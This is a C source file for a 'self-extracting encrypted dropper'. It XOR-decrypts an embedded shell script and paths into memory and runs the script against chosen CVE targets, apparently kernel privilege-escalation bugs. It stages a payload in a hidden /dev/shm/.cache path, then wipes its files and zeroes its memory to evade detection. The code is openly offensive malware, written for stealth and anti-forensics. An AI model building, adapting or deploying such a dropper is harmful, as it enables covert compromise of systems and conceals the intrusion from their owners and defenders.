/*
 * drop.c -- self-extracting encrypted dropper
 *
 * All payload strings (script content, paths, names) are XOR-encrypted
 * in the binary and decrypted into anonymous mmap pages at runtime.
 * After use, pages are zeroed and unmapped.
 *
 * Usage:
 *   ./drop [CVE_TARGET] [PAYLOAD_PATH]
 *
 *   CVE_TARGET:   1086, 32233, or 0 for both (default: 0)
 *   PAYLOAD_PATH: path to nfttables binary to deploy (optional)
 *
 * Build:
 *   python3 gen_drop.py > _drop_data.h
 *   cc -O2 -static -o drop drop.c && strip -s drop
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

#include "_drop_data.h"

/* decrypt a payload into an mmap'd page */
static char *decrypt_payload(int id)
{
    const unsigned char *enc = _drop_idx[id].data;
    unsigned int len = _drop_idx[id].len;
    char *buf;
    unsigned int i;

    buf = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED)
        return NULL;

    for (i = 0; i < len; i++)
        buf[i] = enc[i] ^ _drop_key[i % DROP_KEY_LEN];

    return buf;
}

/* zero and unmap a decrypted buffer */
static void shred_payload(char *buf, int id)
{
    unsigned int len = _drop_idx[id].len;
    if (buf && buf != MAP_FAILED) {
        memset(buf, 0, len);
        munmap(buf, len);
    }
}

static int mkdir_p(const char *path)
{
    char tmp[256];
    char *p;
    size_t len;

    snprintf(tmp, sizeof(tmp), "%s", path);
    len = strlen(tmp);
    if (tmp[len - 1] == '/')
        tmp[len - 1] = '\0';

    for (p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            mkdir(tmp, 0700);
            *p = '/';
        }
    }
    return mkdir(tmp, 0700);
}

/* write decrypted content to a file, mode 0700 */
static int write_file(const char *path, const char *data, size_t len)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd < 0)
        return -1;
    write(fd, data, len);
    close(fd);
    return 0;
}

/* recursively remove a directory */
static void rm_rf(const char *path)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rm -rf '%s'", path);
    system(cmd);
}

int main(int argc, char *argv[])
{
    char *script, *tmp_dir, *mod_dir;
    const char *cve_target = "0";
    const char *payload_path = NULL;
    char script_path[256], env_mod[256], env_pay[256], env_dep[256];
    int status;
    pid_t pid;

    if (argc > 1)
        cve_target = argv[1];
    if (argc > 2)
        payload_path = argv[2];

    /* decrypt all payloads */
    script  = decrypt_payload(DROP_SCRIPT);
    tmp_dir = decrypt_payload(DROP_TMP_DIR);
    mod_dir = decrypt_payload(DROP_MOD_DIR);

    if (!script || !tmp_dir || !mod_dir) {
        _exit(1);
    }

    /* set up workspace */
    mkdir_p(mod_dir);

    /* write setup script */
    snprintf(script_path, sizeof(script_path), "%s/s", tmp_dir);
    write_file(script_path, script, strlen(script));

    /* prepare environment */
    snprintf(env_mod, sizeof(env_mod), "MOD_DIR=%s", mod_dir);
    snprintf(env_dep, sizeof(env_dep), "DEPLOY_PATH=/dev/shm/.cache");

    if (payload_path)
        snprintf(env_pay, sizeof(env_pay), "PAYLOAD=%s", payload_path);
    else
        env_pay[0] = '\0';

    /* fork and exec the setup script */
    pid = fork();
    if (pid == 0) {
        putenv(env_mod);
        putenv(env_dep);
        if (env_pay[0])
            putenv(env_pay);
        execl("/bin/sh", "sh", script_path, cve_target, NULL);
        _exit(127);
    }
    waitpid(pid, &status, 0);

    /* cleanup: remove workspace and shred decrypted pages */
    unlink(script_path);
    rm_rf(tmp_dir);

    shred_payload(script, DROP_SCRIPT);
    shred_payload(tmp_dir, DROP_TMP_DIR);
    shred_payload(mod_dir, DROP_MOD_DIR);

    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}
